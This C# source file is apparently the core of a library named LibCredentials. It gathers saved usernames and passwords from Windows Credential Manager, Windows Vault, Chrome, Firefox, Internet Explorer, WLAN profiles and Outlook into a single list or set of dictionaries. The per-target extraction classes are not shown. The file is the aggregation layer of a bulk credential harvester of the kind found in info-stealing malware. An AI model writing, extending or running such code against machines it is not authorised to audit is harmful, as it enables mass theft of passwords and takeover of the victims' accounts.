using System;
using System.Collections.Generic;
using System.Linq;
using LibCredentials.Targets;

namespace LibCredentials
{
    public static class LibCredentials
    {
        // http://securityxploded.com/passwordsecrets.php#Skype
        // http://securityxploded.com/outlookpassworddecryptor.php

        public static Type[] TargetTypes =
        {
            typeof(CredEnumerate),
            typeof(WindowsVault),
            typeof(Chrome),
            typeof(Wlan),
            typeof(Firefox),
            typeof(Iexplorer),
            typeof(Outlook)
        };

        public static Credential[] GetAllCredentials() =>
            TargetTypes.SelectMany(tt => ((Target) Activator.CreateInstance(tt)).GetCredentials()).ToArray();

        public static Dictionary<string, string>[] GetAllCredentialsAsDictionary() =>
            GetAllCredentials().Select(c => new Dictionary<string, string>
            {
                ["UserName"] = c.Username,
                ["Password"] = c.Password,
                ["Extra"] = c.Extra,
                ["Type"] = c.Type.ToString()
            }).ToArray();
    }
}